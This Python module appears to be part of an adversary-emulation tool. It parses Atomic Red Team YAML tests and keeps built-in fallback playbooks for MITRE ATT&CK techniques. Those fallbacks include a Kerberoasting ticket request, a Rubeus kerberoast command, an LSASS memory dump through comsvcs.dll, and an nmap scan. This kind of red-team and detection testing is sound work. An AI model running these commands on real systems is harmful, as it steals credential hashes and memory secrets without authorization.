"""Parses Atomic Red Team's YAML test definitions from disk, with built-in
fallbacks for common MITRE ATT&CK techniques.
"""
from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
import yaml


@dataclass
class AtomicTest:
    technique_id: str
    name: str
    command: str
    platform: str


_BUILTIN_PLAYBOOKS: dict[str, list[AtomicTest]] = {
    "T1558": [
        AtomicTest(
            technique_id="T1558",
            name="Request Service Ticket (Kerberoasting)",
            command="powershell -Command Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/dc01'",
            platform="windows",
        ),
        AtomicTest(
            technique_id="T1558",
            name="Rubeus Kerberoast",
            command="Rubeus.exe kerberoast /outfile:hashes.kerberoast",
            platform="windows",
        ),
    ],
    "T1003": [
        AtomicTest(
            technique_id="T1003",
            name="Dump LSASS via comsvcs.dll",
            command="rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\lsass.dmp full",
            platform="windows",
        ),
    ],
    "T1046": [
        AtomicTest(
            technique_id="T1046",
            name="Port Scan with Nmap",
            command="nmap -sS -p 88,389,445,3389 -Pn target",
            platform="linux",
        ),
    ],
}


def load_playbooks(technique_id: str, search_path: Path | str | None = None) -> list[AtomicTest]:
    """Load atomic test playbooks for technique_id from YAML or built-ins."""
    tech = technique_id.upper()

    if search_path is not None:
        p = Path(search_path)
    else:
        p = Path(__file__).resolve().parents[1] / "data" / "raw_datasets" / "atomics" / tech / f"{tech}.yaml"

    if p.is_file():
        try:
            with open(p, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
                tests = []
                for t in data.get("atomic_tests", []):
                    exec_cmd = t.get("executor", {}).get("command", "")
                    tests.append(
                        AtomicTest(
                            technique_id=tech,
                            name=t.get("name", "Atomic Test"),
                            command=exec_cmd,
                            platform=t.get("supported_platforms", ["windows"])[0] if t.get("supported_platforms") else "windows",
                        )
                    )
                if tests:
                    return tests
        except Exception:
            pass

    return _BUILTIN_PLAYBOOKS.get(tech, [])
